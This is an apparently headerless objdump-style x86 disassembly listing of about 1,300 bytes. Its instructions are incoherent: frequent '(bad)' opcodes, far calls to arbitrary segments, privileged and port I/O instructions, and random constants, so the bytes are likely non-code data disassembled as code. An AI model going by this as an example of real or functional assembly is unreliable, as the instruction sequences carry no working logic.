  4332d2:	arpl   WORD PTR ds:0xcfc83624,cx
  4332d8:	mov    dl,0x90
  4332da:	jg     0x433300
  4332dc:	mov    esi,0x4c5cd0f8
  4332e1:	or     ebx,ebp
  4332e3:	push   0xd742be25
  4332e8:	sbb    bl,BYTE PTR [ecx]
  4332ea:	call   0xd044:0x271a75bb
  4332f1:	mov    al,0x49
  4332f3:	test   eax,0xe22e2dbb
  4332f8:	push   ebp
  4332f9:	inc    ecx
  4332fa:	test   al,0xe4
  4332fc:	mov    edx,0x9267932a
  433301:	bound  ecx,QWORD PTR [ebx]
  433303:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433304:	adc    DWORD PTR [edx],ebx
  433306:	ins    DWORD PTR es:[edi],dx
  433307:	ror    DWORD PTR [ebp+eiz*1+0x160640c4],0xed
  43330f:	daa    
  433310:	leave  
  433311:	jmp    0x329a:0x673cbb9c
  433318:	ins    DWORD PTR es:[edi],dx
  433319:	mov    ds:0x2c684ed2,eax
  43331e:	sbb    DWORD PTR [edi-0x3c4cbd02],esp
  433324:	aaa    
  433325:	fisttp DWORD PTR [eax]
  433327:	mov    cl,0xb3
  433329:	jne    0x43338f
  43332b:	sbb    DWORD PTR [eax+eiz*8-0x37],ebp
  43332f:	outs   dx,BYTE PTR ds:[esi]
  433330:	push   ebp
  433331:	jmp    0xa7a0:0xc0763c26
  433338:	push   esp
  433339:	add    BYTE PTR [eax+0x28a10da9],0xd0
  433340:	mov    dl,0xf7
  433342:	rcl    BYTE PTR [eax+0x22],1
  433345:	loope  0x433315
  433347:	jl     0x4332ee
  433349:	ss xchg ecx,eax
  43334b:	and    dl,ch
  43334d:	(bad)  
  43334e:	mov    BYTE PTR [eax+0x6e],cl
  433351:	or     esp,DWORD PTR [ebx-0x6e]
  433354:	xor    esi,DWORD PTR es:[eax]
  433357:	cmp    DWORD PTR [ebp+0x34cfd995],0xb79ba12b
  433361:	adc    eax,0x1917439d
  433366:	cs fs pushf 
  433369:	or     edx,DWORD PTR [ecx+0x61fae357]
  43336f:	(bad)  
  433370:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433371:	bound  eax,QWORD PTR [esi+0x71]
  433374:	mov    cl,0x91
  433376:	mov    bl,0x5f
  433378:	mov    ch,0xb3
  43337a:	fld    DWORD PTR [si]
  43337d:	or     DWORD PTR [eax+esi*8],esp
  433380:	pusha  
  433381:	out    dx,al
  433382:	pop    ss
  433383:	test   eax,0xbf659cd2
  433388:	mov    dl,0x7
  43338a:	jo     0x433373
  43338c:	inc    eax
  43338d:	adc    BYTE PTR [esi],0xd7
  433390:	mov    eax,ds:0x1cc1ce0c
  433395:	retf   0x677f
  433398:	(bad)  
  433399:	(bad)  
  43339a:	dec    ebx
  43339b:	cwde   
  43339c:	mov    dl,0x61
  43339e:	mov    ecx,0xa2d3e35a
  4333a3:	test   al,0x71
  4333a5:	or     ebp,DWORD PTR [ebp+0x6]
  4333a8:	mov    BYTE PTR [ecx-0x44],0x33
  4333ac:	mov    eax,0x5aa9dab
  4333b1:	test   ebx,esp
  4333b3:	loopne 0x4333d0
  4333b5:	or     eax,DWORD PTR [edi+0x57]
  4333b8:	mov    ecx,0xeda7c66d
  4333bd:	popa   
  4333be:	xor    ebx,DWORD PTR [ebx]
  4333c0:	dec    eax
  4333c1:	xchg   edx,eax
  4333c2:	dec    ecx
  4333c3:	leave  
  4333c4:	mov    dl,0xef
  4333c6:	push   cs
  4333c7:	sbb    BYTE PTR [edi],bl
  4333c9:	in     al,dx
  4333ca:	mov    dl,0xe4
  4333cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4333cd:	ss out 0x89,al
  4333d0:	mov    ebp,0x12da22ea
  4333d5:	xchg   ebx,eax
  4333d6:	jo     0x433391
  4333d8:	in     eax,dx
  4333d9:	lea    esi,[esi-0x6f574401]
  4333df:	lock pop esi
  4333e1:	mov    ds:0x5d98df94,eax
  4333e6:	call   0x6b6e:0x6d3ce46f
  4333ed:	ja     0x433444
  4333ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4333f0:	or     esp,ebp
  4333f2:	jmp    0xf15527b8
  4333f7:	mov    ebx,0xecc2e7bd
  4333fc:	cs push ss
  4333fe:	leave  
  4333ff:	mov    bh,0xb2
  433401:	stos   BYTE PTR es:[edi],al
  433402:	jb     0x433390
  433404:	out    0xca,al
  433406:	lods   eax,DWORD PTR ds:[esi]
  433407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433408:	and    al,0x64
  43340a:	mov    gs,WORD PTR [eax+0x68b0ede]
  433410:	mov    dl,0xda
  433412:	mov    ch,0x2a
  433414:	out    dx,eax
  433415:	jle    0x4333ba
  433417:	push   edx
  433418:	imul   ecx,DWORD PTR [ebx],0xacd94b47
  43341e:	loopne 0x433406
  433420:	jg     0x4333b6
  433422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433423:	push   ebx
  433424:	fisttp WORD PTR [ebx]
  433426:	fwait
  433427:	pop    eax
  433428:	sbb    DWORD PTR [edx+0x7bfeb1e9],0xa3ad9de
  433432:	xor    DWORD PTR [ebp-0x41],edi
  433435:	shr    DWORD PTR [edi-0x63d4a4aa],0x9d
  43343c:	mov    dl,0x84
  43343e:	xchg   esi,eax
  43343f:	or     BYTE PTR [ebx],0x24
  433442:	shl    BYTE PTR ds:0xa740f58f,1
  433448:	sbb    ebp,DWORD PTR [ebx+0xceb65f8]
  43344e:	call   0x2c9de65e
  433453:	jl     0x43347c
  433455:	and    bl,BYTE PTR [edx]
  433457:	fistp  QWORD PTR [edi-0x4d993dcf]
  43345d:	mov    ds:0xf3c908ae,al
  433462:	cmp    dh,BYTE PTR [eax-0x4e]
  433465:	in     al,dx
  433466:	inc    esi
  433467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433468:	(bad)  
  433469:	cmp    BYTE PTR [ebx-0x52],bh
  43346c:	mov    ebp,0xd01e110b
  433471:	(bad)  
  433472:	mov    al,ds:0x9a4d175e
  433477:	cmp    ebx,DWORD PTR [esi]
  433479:	(bad)  
  43347a:	mov    ebp,0xdd16d5d6
  43347f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433480:	jae    0x43340d
  433482:	sub    al,0x5
  433484:	and    DWORD PTR [edx-0x7c],esp
  433487:	pop    es
  433488:	mov    esp,0x2691d646
  43348d:	or     edi,DWORD PTR [ecx+0x25]
  433490:	cs arpl dx,bp
  433493:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433494:	in     eax,dx
  433495:	dec    edx
  433496:	sti    
  433497:	in     al,0x3a
  433499:	mov    ss,ecx
  43349b:	sbb    BYTE PTR [edx-0x497a8097],dh
  4334a1:	sbb    ecx,DWORD PTR ss:[edx+0x6a950bb7]
  4334a8:	stos   BYTE PTR es:[edi],al
  4334a9:	sahf   
  4334aa:	xor    bh,BYTE PTR [esi+0x7f9aba1e]
  4334b0:	jbe    0x4334d4
  4334b2:	pop    eax
  4334b3:	inc    edx
  4334b4:	fnstenv ds:0xd580a7b7
  4334ba:	fsub   st(6),st
  4334bc:	outs   dx,DWORD PTR ds:[esi]
  4334bd:	mov    BYTE PTR [ecx+ecx*4+0x3b559cb2],cl
  4334c4:	xchg   ebx,eax
  4334c5:	lea    ebx,[ebp+0x10b32d6]
  4334cb:	push   cs
  4334cc:	repnz in al,dx
  4334ce:	jb     0x4334cf
  4334d0:	inc    edi
  4334d1:	mov    edi,0x61da3495
  4334d6:	ins    DWORD PTR es:[edi],dx
  4334d7:	pop    es
  4334d8:	push   cs
  4334d9:	enter  0x3e1f,0xab
  4334dd:	push   edi
  4334de:	mov    bl,0xc
  4334e0:	mov    cl,0x71
  4334e2:	dec    edi
  4334e3:	(bad)  
  4334e4:	mov    ah,0xaf
  4334e6:	cmp    ch,BYTE PTR [ebx]
  4334e8:	jo     0x433538
  4334ea:	call   0xebdb:0x2e9f989f
  4334f1:	sbb    BYTE PTR fs:[edi+0x2dfed09b],ah
  4334f8:	push   ebx
  4334f9:	dec    ecx
  4334fa:	push   ds
  4334fb:	pop    esp
  4334fc:	dec    esp
  4334fd:	adc    al,BYTE PTR [esi+0x1a055ff5]
  433503:	jne    0x433522
  433505:	push   esp
  433506:	punpcklbw mm0,mm3
  433509:	or     ebp,DWORD PTR [ecx-0x68]
  43350c:	(bad)  
  43350d:	cmp    BYTE PTR [edi-0x625acdeb],0x14
  433514:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433515:	lahf   
  433516:	jmp    0x8a8ea7b6
  43351b:	jmp    0x433569
  43351d:	or     edx,DWORD PTR [edx]
  43351f:	(bad)
  433522:	rcr    ebp,cl
  433524:	or     eax,0x1b4f9a57
  433529:	push   DWORD PTR [edi]
  43352b:	cwde   
  43352c:	mov    esi,0x3ab8bfe9
  433531:	push   eax
  433532:	sbb    BYTE PTR [edi+0x2160fee1],ah
  433538:	mov    al,0x3d
  43353a:	call   0x91dc:0xa9f210bd
  433541:	dec    edi
  433542:	mov    eax,0x7a0bf3d1
  433547:	sbb    eax,DWORD PTR [ebp-0x80]
  43354a:	fadd   st,st(1)
  43354c:	xchg   DWORD PTR [ecx-0x6ebdf018],ebx
  433552:	call   0x734d:0xaaafbffb
  433559:	pop    esp
  43355a:	and    DWORD PTR [edi-0x6edbe79e],0x3d
  433561:	lds    eax,FWORD PTR [ebp+0x2ac3477b]
  433567:	xchg   ebx,eax
  433568:	mov    dl,0xfd
  43356a:	jnp    0x4335e5
  43356c:	stos   DWORD PTR es:[edi],eax
  43356d:	call   0xb67c107
  433572:	cmp    DWORD PTR [edx],eax
  433574:	popa   
  433575:	jno    0x433516
  433577:	push   esi
  433578:	xor    eax,0x48e09a44
  43357d:	pop    eax
  43357e:	ret    0x49fb
  433581:	mov    bl,0x7d
  433583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433584:	test   eax,0xc9ad9cd6
  433589:	mov    eax,ds:0xf4b2220e
  43358e:	daa    
  43358f:	dec    edi
  433590:	dec    ebx
  433591:	pop    eax
  433592:	sub    al,0x6
  433594:	pop    ebx
  433595:	or     edx,edi
  433597:	pop    ecx
  433598:	mov    ebp,DWORD PTR [esi]
  43359a:	sbb    eax,0x89297418
  43359f:	cli    
  4335a0:	sub    edi,esi
  4335a2:	call   0x4afc:0x376a6579
  4335a9:	or     eax,DWORD PTR [ebp+0x7db276ad]
  4335af:	adc    ebx,DWORD PTR [ebx+0x6d]
  4335b2:	cdq    
  4335b3:	sbb    al,0x9f
  4335b5:	fst    QWORD PTR [eax]
  4335b7:	xor    edi,DWORD PTR [ebp-0x57]
  4335ba:	popa   
  4335bb:	(bad)  
  4335bc:	(bad)  
  4335bd:	jno    0x433567
  4335bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4335c0:	das    
  4335c1:	lods   eax,DWORD PTR ds:[esi]
  4335c2:	pop    ebx
  4335c3:	xor    BYTE PTR [edx],dl
  4335c5:	push   0xffffffba
  4335c7:	dec    ecx
  4335c8:	mov    dl,0xae
  4335ca:	icebp  
  4335cb:	dec    ebx
  4335cc:	cdq    
  4335cd:	mov    BYTE PTR [esp+edx*1],al
  4335d0:	outs   dx,DWORD PTR ds:[esi]
  4335d1:	or     eax,edx
  4335d3:	and    DWORD PTR [ebx+eax*2+0x3728ebec],ecx
  4335da:	call   0xbbe0:0xfa710a77
  4335e1:	fsubr  DWORD PTR [ebx]
  4335e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4335e4:	mov    edi,0x9a53451
  4335e9:	rcl    BYTE PTR [eax+0x3d],cl
  4335ec:	mov    dl,0x20
  4335ee:	sahf   
  4335ef:	sub    eax,0xfcfaecab
  4335f4:	jno    0x433601
  4335f6:	mov    ds:0x42300360,eax
  4335fb:	cmp    ah,dl
  4335fd:	ds call 0x4aff:0xe266b561
  433605:	aam    0x84
  433607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433608:	mov    esp,0xa057de17
  43360d:	mov    ebp,eax
  43360f:	mov    edx,0xb84ac9b3
  433614:	xchg   edx,eax
  433615:	popa   
  433616:	ins    BYTE PTR es:[edi],dx
  433617:	mov    ebp,0xb619dcf6
  43361c:	imul   eax,ebx,0xae12fb0
  433622:	enter  0xac2b,0xf6
  433626:	lahf   
  433627:	xor    BYTE PTR [ebx+ebp*2-0x7e],dl
  43362b:	test   al,0x8f
  43362d:	fnstsw WORD PTR [esi+0x27]
  433630:	mov    ds:0xa1e23f74,eax
  433635:	push   ebp
  433636:	adc    BYTE PTR [eax-0x54cd6fcf],ah
  43363c:	sub    eax,0x9833949a
  433641:	enter  0xcfed,0xb5
  433645:	pop    ecx
  433646:	jmp    0xd30a:0x2afa12af
  43364d:	push   edi
  43364e:	nop
  43364f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433650:	xor    edi,DWORD PTR [esi-0xf]
  433653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433654:	cmp    cl,BYTE PTR [edi+0x11]
  433657:	jnp    0x433606
  433659:	or     eax,0x7b7258bc
  43365e:	into   
  43365f:	daa    
  433660:	push   0x7
  433662:	push   eax
  433663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  433664:	dec    eax
  433665:	mov    ds,eax
  433667:	mov    WORD PTR [eax+ebp*4+0x1c],ds
  43366b:	daa    
  43366c:	in     al,0x53
  43366e:	data16 cld 
  433670:	out    0xc8,al
  433672:	hlt    
  433673:	lahf   
  433674:	loope  0x433609
  433676:	mov    al,ds:0x13c1b21f
  43367b:	stc    
  43367c:	cs jo  0x433655
  43367f:	imul   eax,esi,0x4d
  433682:	xchg   ch,bl
  433684:	out    dx,eax
  433685:	call   0x14155ee4
  43368a:	stos   DWORD PTR es:[edi],eax
  43368b:	push   ss
  43368c:	or     bh,BYTE PTR gs:[edx]
  43368f:	push   edi
  433690:	loopne 0x43362e
  433692:	push   eax
  433693:	imul   esp,ebp,0x25
  433696:	cmp    ah,BYTE PTR [ecx-0x39]
  433699:	or     esi,DWORD PTR [edi-0x14]
  43369c:	or     al,0xa5
  43369e:	sub    eax,0x9b827243
  4336a3:	jb     0x4336e4
  4336a5:	lahf   
  4336a6:	jbe    0x4336cc
  4336a8:	ins    BYTE PTR es:[edi],dx
  4336a9:	push   ds
  4336aa:	jp     0x43366c
  4336ac:	leave  
  4336ad:	or     ecx,DWORD PTR [eax-0x4d]
  4336b0:	ins    DWORD PTR es:[edi],dx
  4336b1:	mov    cl,0xd2
  4336b3:	push   eax
  4336b4:	lidtd  [edx-0x64823346]
  4336bb:	and    esi,esi
  4336bd:	jnp    0x43365e
  4336bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4336c0:	add    DWORD PTR [ebp-0x6b12ca24],0x89b28233
  4336ca:	iret   
  4336cb:	xor    al,0xbc
  4336cd:	lea    ebx,[ecx]
  4336cf:	jmp    0x4200:0xe7290a61
  4336d6:	sahf   
  4336d7:	mov    dl,BYTE PTR [ecx+0x3b]
  4336da:	push   ss
  4336db:	or     al,0x96
  4336dd:	jecxz  0x43366b
  4336df:	sub    BYTE PTR [edx+0x3f7db600],dh
  4336e5:	rcr    BYTE PTR ds:0xef3b3aa7,0x64
  4336ec:	dec    esi
  4336ed:	test   al,0xe1
  4336ef:	out    0xb1,al
  4336f1:	popa   
  4336f2:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  4336f4:	lods   al,BYTE PTR ds:[esi]
  4336f5:	int3   
  4336f6:	aam    0x67
  4336f8:	ins    DWORD PTR es:[edi],dx
  4336f9:	pop    ss
  4336fa:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4336fc:	add    al,0x4f
  4336fe:	and    esi,edi
  433700:	push   esp
  433701:	mov    edi,0xb22a37
  433706:	jmp    0x4336d5
  433708:	mov    BYTE PTR [esi],ah
  43370a:	mov    ds:0x700c1e9,al
  43370f:	mov    bl,bh
  433711:	retf   0xd95
  433714:	xor    eax,0xa857e607
  433719:	mov    cs,WORD PTR [eax-0x15]
  43371c:	mov    dl,0xf1
  43371e:	dec    edx
  43371f:	inc    esi
  433720:	pop    ss
  433721:	sbb    cl,BYTE PTR [ebx]
  433723:	stos   BYTE PTR es:[edi],al
  433724:	inc    esp
  433725:	or     ebx,DWORD PTR [esi+0x69]
  433728:	pop    esp
  433729:	int    0xc9
  43372b:	je     0x43372c
  43372d:	daa    
  43372e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43372f:	inc    eax
  433730:	das    
  433731:	mov    esi,DWORD PTR [ebx+0xa]
  433734:	mov    eax,DWORD PTR [eax]
  433736:	adc    BYTE PTR [ebp-0x35abf314],bl
  43373c:	sbb    cl,BYTE PTR [edi-0x4f9ba94e]
  433742:	(bad)  
  433743:	arpl   WORD PTR [esi-0x4],cx
  433746:	call   0xf28a:0x90aa6af5
  43374d:	sub    ch,BYTE PTR [edi-0x2c]
  433750:	test   BYTE PTR [ebx],0x3
  433753:	sub    eax,0x413fa43b
  433758:	xor    eax,0xbfe59ab5
  43375d:	loope  0x4337cd
  43375f:	cmc    
  433760:	mov    edx,0xa1a7a963
  433765:	lahf   
  433766:	out    0x60,eax
  433768:	outs   dx,DWORD PTR ds:[esi]
  433769:	mov    ss,esp
  43376b:	cmp    BYTE PTR [ebp-0x2f5e7bcf],0xca
  433772:	xchg   dh,dh
  433774:	sub    eax,0xe0f24292
  433779:	or     esi,ecx
  43377b:	fisttp QWORD PTR [edx+esi*2-0x80]
  43377f:	xor    eax,0x5a9b422f
  433784:	cmp    ebx,DWORD PTR [ebx+0x4b]
  433787:	loop   0x433719
  433789:	xor    DWORD PTR [edx-0x1],ebx
  43378c:	pop    esi
  43378d:	or     al,dh
  43378f:	call   0xf7a7:0x865cb366
  433796:	adc    edx,DWORD PTR [edx+esi*4]
  433799:	hlt    
  43379a:	mov    bl,0xf2
  43379c:	pusha  
  43379d:	addr16 stc 
  43379f:	mov    dh,0xea
  4337a1:	or     edi,DWORD PTR [ecx]
  4337a3:	mov    ebx,0xfcbceb24
  4337a8:	xor    al,0x86
  4337aa:	call   0x21a8:0x3eb2a0c3
  4337b1:	or     eax,0xf7d7a0a8
  4337b6:	or     edi,DWORD PTR [ecx]
  4337b8:	and    bl,BYTE PTR [ebx+0x69]
  4337bb:	rcr    bl,0xe5
  4337be:	xchg   al,cl
  4337c0:	inc    edi
  4337c1:	mov    esi,0x330fdada
  4337c6:	mov    eax,0x3c272a58
  4337cb:	mov    ah,0x72
  4337cd:	add    al,0x54
  4337cf:	mov    BYTE PTR [edx],dh
  4337d1:	cmp    BYTE PTR [ecx-0x6063f56e],ah
  4337d7:	jbe    0x43380d
  4337d9:	push   ecx
  4337da:	jo     0x4337ca
  4337dc:	xor    ah,BYTE PTR [edx-0x64]
  4337df:	xor    ebx,edi
  4337e1:	sti    
  4337e2:	cmc    
  4337e3:	pop    edi
  4337e4:	jae    0x43381d
  4337e6:	lock (bad) [edx]
  4337e9:	in     al,0x3c
  4337eb:	inc    eax
  4337ec:	xchg   ecx,eax
  4337ed:	daa    
  4337ee:	mov    eax,ds:0xf26db288
  4337f3:	jge    0x43378d
  4337f5:	sub    al,0xa8
  4337f7:	stc    
  4337f8:	jno    0x433806
  4337fa:	(bad)  
  4337fb:	xlat   BYTE PTR ds:[ebx]
  4337fc:	jmp    0x7d57de21
  433801:	mov    ds:0x5ba6e062,eax
  433806:	jbe    0x433852
  433808:	mov    esp,0xbdc029da
  43380d:	dec    ebx
  43380e:	push   esp
  43380f:	js     0x4337d5
  433811:	dec    ebx
  433812:	dec    eax
  433813:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433814:	add    ch,BYTE PTR [esi+0x46]
  433817:	sbb    DWORD PTR [ecx-0x4208b3e5],edi
  43381d:	aas    
  43381e:	xor    DWORD PTR [ecx],edi
  433820:	push   ds
  433821:	stos   DWORD PTR es:[edi],eax
  433822:	lahf   
  433823:	ss mov esp,0xf5a94711
  433829:	rcr    bh,1
  43382b:	leave  
  43382c:	outs   dx,DWORD PTR ds:[esi]
  43382d:	dec    edx
  43382e:	mov    bx,0x991b
  433832:	inc    ebp
  433833:	pop    edi
  433834:	push   eax
  433835:	lea    edi,[esi-0x673f2bc9]
  43383b:	popa   
  43383c:	stos   DWORD PTR es:[edi],eax
  43383d:	xchg   esp,eax
  43383e:	jp     0x4338a7
  433840:	repnz and dl,BYTE PTR [ebx+ebx*8+0x57]
  433845:	out    0xe0,eax
  433847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  433848:	popf   
  433849:	fisubr WORD PTR [ecx]
  43384b:	jo     0x433856
  43384d:	bound  edi,QWORD PTR gs:[ebx-0xb]
  433851:	dec    ecx
  433852:	call   0x8b5c:0x4856aef7
  433859:	xchg   ecx,eax
  43385a:	sahf   
  43385b:	test   al,0x48
  43385d:	sub    BYTE PTR [ebx],bl
  43385f:	(bad)  
  433861:	inc    edi
  433862:	jg     0x43386a
  433864:	(bad)  
  433865:	pusha  
  433866:	xchg   ecx,eax
  433867:	out    0xa3,al
  433869:	pop    ebp
  43386a:	cmp    BYTE PTR [edi],ah
  43386c:	xchg   esp,eax
  43386d:	leave  
  43386e:	jbe    0x433874
  433870:	dec    esp
  433871:	or     eax,DWORD PTR [edi]
  433873:	outs   dx,DWORD PTR ds:[esi]
  433874:	scas   al,BYTE PTR es:[edi]
  433875:	idiv   BYTE PTR [ebp+0x29]
  433878:	mov    al,0xfc
  43387a:	cdq    
  43387b:	fwait
  43387c:	jne    0x4338bd
  43387e:	push   eax
  43387f:	outs   dx,BYTE PTR ds:[esi]
  433880:	jmp    0x526e7230
  433885:	or     ecx,ebx
  433887:	es xchg edx,eax
  433889:	dec    edx
  43388a:	mov    dh,0x4f
  43388c:	pop    ebp
  43388d:	inc    esp
  43388e:	call   0xf71:0xf570193e
  433895:	xchg   DWORD PTR [ecx-0x59],ebp
  433898:	mov    dh,0xd9
  43389a:	pop    edi
  43389b:	or     bl,BYTE PTR [ebx+0x49]
  43389e:	inc    esp
  43389f:	xor    BYTE PTR [edx-0x368062f0],0xe4
  4338a6:	loop   0x4338f3
  4338a8:	or     eax,0x1378530b
  4338ad:	mov    cl,0xb5
  4338af:	imul   ebp,DWORD PTR [ebx],0x490d9a16
  4338b5:	outs   dx,DWORD PTR ds:[esi]
  4338b6:	cmc    
  4338b7:	pop    ebp
  4338b8:	sub    DWORD PTR ds:0x650a73d,edx
  4338be:	shl    DWORD PTR [eax-0x3e],1
  4338c1:	mov    ch,0xa2
  4338c3:	mov    DWORD PTR [edx-0x197cacc1],esi
  4338c9:	mov    BYTE PTR [ebx],al
  4338cb:	adc    BYTE PTR [edi+0x4f6a1704],bl
  4338d1:	bnd js 0x433897
  4338d4:	test   DWORD PTR [edx+edi*2+0x74],esi
  4338d8:	mov    ebp,0xa986851f
  4338dd:	int    0xda
  4338df:	or     BYTE PTR [edx+0x31],cl
  4338e2:	or     al,0xae
  4338e4:	sub    BYTE PTR [ebx],cl
  4338e6:	inc    ecx
  4338e7:	dec    edi
  4338e8:	cmc    
  4338e9:	adc    al,0x47
  4338eb:	cdq    
  4338ec:	xchg   ebp,eax
  4338ed:	das    
  4338ee:	(bad)  
  4338ef:	(bad)  
  4338f0:	jo     0x433970
  4338f2:	push   0x77
  4338f4:	or     bl,BYTE PTR [ecx+0x1ab2d774]
  4338fa:	test   BYTE PTR ds:0xf710cb94,cl
  433900:	lods   eax,DWORD PTR ds:[esi]
  433901:	and    ebp,DWORD PTR [ebx]
  433903:	call   0xe850:0x92510b41
  43390a:	inc    esi
  43390b:	lods   eax,DWORD PTR ds:[esi]
  43390c:	enter  0x9ab8,0x39
  433910:	mov    bl,0x91
  433912:	add    eax,0xc028724b
  433917:	mov    ds:0x968622b7,al
  43391c:	or     bl,0x44
  43391f:	dec    di
  433921:	inc    esp
  433922:	call   0x7f1f:0x64e58c92
  433929:	out    dx,al
  43392a:	cli    
  43392b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43392c:	fnstsw WORD PTR [ebx+eax*2]
  43392f:	jl     0x433964
  433931:	mov    ch,0xcf
  433933:	mov    ah,0x89
  433935:	lods   al,BYTE PTR ds:[esi]
  433936:	xor    eax,0x7500d3a7
  43393b:	add    ch,ch
  43393d:	pop    edx
  43393e:	mov    esi,0x33083537
  433943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433944:	push   ss
  433945:	js     0x433947
  433947:	loope  0x433966
  433949:	retf   0x45df
  43394c:	xor    bl,cl
  43394e:	inc    edi
  43394f:	in     al,0xb2
  433951:	xchg   BYTE PTR [ecx-0x3],al
  433954:	ins    DWORD PTR es:[edi],dx
  433955:	fstp   DWORD PTR [edx+esi*4]
  433958:	(bad)  
  433959:	or     esi,edi
  43395b:	dec    esi
  43395c:	sbb    BYTE PTR [ebx+0x6915b11a],bl
  433962:	call   0xf1b5:0x31001494
  433969:	ds (bad) 
  43396b:	fwait
  43396c:	in     eax,dx
  43396d:	xchg   edx,eax
  43396e:	jecxz  0x433942
  433970:	jecxz  0x43397c
  433972:	loope  0x4339da
  433974:	xor    eax,0x1f5b6a88
  433979:	xlat   BYTE PTR ds:[ebx]
  43397a:	mov    ah,BYTE PTR [ecx-0x36]
  43397d:	pop    es
  43397e:	(bad)  
  43397f:	int3   
  433980:	pop    esp
  433981:	add    eax,0xcb379763
  433986:	or     esi,ebp
  433988:	sub    eax,0xb8a74f6d
  43398d:	shr    DWORD PTR [eax+edx*4-0x2e769417],0xc3
  433995:	adc    BYTE PTR [ecx+0x418be269],ah
  43399b:	scas   eax,DWORD PTR es:[edi]
  43399c:	cmc    
  43399d:	clc    
  43399e:	outs   dx,DWORD PTR ds:[esi]
  43399f:	jno    0x4339e7
  4339a1:	or     eax,DWORD PTR [ebp-0x6a03d55b]
  4339a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4339a8:	xor    DWORD PTR [ecx-0x63],ebp
  4339ab:	fstp   TBYTE PTR [esi+0x3192d41b]
  4339b1:	pop    esp
  4339b2:	std    
  4339b3:	sbb    al,0xe7
  4339b5:	jmp    0x433978
  4339b7:	pop    ds
  4339b8:	or     ecx,DWORD PTR [ebx]
  4339ba:	rcr    bp,0x4d
  4339be:	mov    al,0x99
  4339c0:	int3   
  4339c1:	sbb    BYTE PTR [ecx-0x691aa403],0x4d
  4339c8:	pushf  
  4339c9:	sar    bh,0x1f
  4339cc:	shr    DWORD PTR [ebp+0x1a],cl
  4339cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4339d0:	cli    
  4339d1:	scas   al,BYTE PTR es:[edi]
  4339d2:	out    0xc4,eax
  4339d4:	ret    
  4339d5:	add    esi,edi
  4339d7:	xor    BYTE PTR [edx+0x3897d347],dh
  4339dd:	adc    al,0xb2
  4339df:	inc    edi
  4339e0:	pop    esp
  4339e1:	fld    TBYTE PTR [ecx+0x6ef3a4b9]
  4339e8:	mov    al,0xdc
  4339ea:	and    eax,0x1faed21e
  4339ef:	pop    es
  4339f0:	or     ah,BYTE PTR [esi]
  4339f2:	call   0xfd65:0x6601ab7c
  4339f9:	sub    eax,0xbed57ff
  4339fe:	push   ebp
  4339ff:	add    ah,BYTE PTR [edi+0x2533d6c1]
  433a05:	jp     0x4339a1
  433a07:	xor    eax,0x88d3b650
  433a0c:	push   0x16
  433a0e:	stos   BYTE PTR es:[edi],al
  433a0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433a10:	test   BYTE PTR [eax+0x58],dh
  433a13:	xor    al,0xa1
  433a15:	nop
  433a16:	mov    ecx,0x48d1b11f
  433a1b:	and    al,0xca
  433a1d:	and    BYTE PTR [ebp+0x1e],cl
  433a20:	add    eax,0x224c765d
  433a25:	or     BYTE PTR [eax],bl
  433a27:	fcomp  st(4)
  433a29:	cmp    esi,DWORD PTR [eax+ebp*2]
  433a2c:	xor    eax,0x1627ec7c
  433a31:	(bad)  
  433a32:	sub    al,0x6a
  433a34:	mov    dl,0x60
  433a36:	add    bl,cl
  433a38:	push   esp
  433a39:	ret    
  433a3a:	and    DWORD PTR [eax+eiz*1+0x7185d60b],0x72
  433a42:	outs   dx,BYTE PTR ds:[esi]
  433a43:	cmp    edx,DWORD PTR [ebx-0x15]
  433a46:	js     0x433a56
  433a48:	lahf   
  433a49:	aas    
  433a4a:	aad    0xd3
  433a4c:	xor    cl,BYTE PTR [edx]
  433a4e:	or     eax,0x730d3fdc
  433a53:	jae    0x433aa5
  433a55:	push   eax
  433a56:	nop
  433a57:	in     eax,0xc1
  433a59:	mov    DWORD PTR [ebx+0x60c2b238],edx
  433a5f:	mov    ds:0xa744fc33,eax
  433a64:	call   0x852e:0x6bf3cc00
  433a6b:	div    BYTE PTR [ecx+0x6d346d4]
  433a71:	adc    eax,0x20617f42
  433a76:	(bad)  
  433a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433a78:	aam    0x30
  433a7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  433a7b:	sub    al,0xb1
  433a7d:	test   eax,0x83b52241
  433a82:	push   0xada45a0
  433a87:	retf   0xed2c
  433a8a:	sbb    DWORD PTR [edi+0x3ec60fc1],esp
  433a90:	rcr    BYTE PTR [ebp+0x42],cl
  433a93:	xor    BYTE PTR [ebx-0x4b6e2650],dh
  433a99:	inc    ebx
  433a9a:	xchg   esi,eax
  433a9b:	xchg   edi,eax
  433a9c:	pop    esi
  433a9d:	in     eax,dx
  433a9e:	sub    ebx,DWORD PTR [edi]
  433aa0:	ud2    
  433aa2:	sbb    al,0xdd
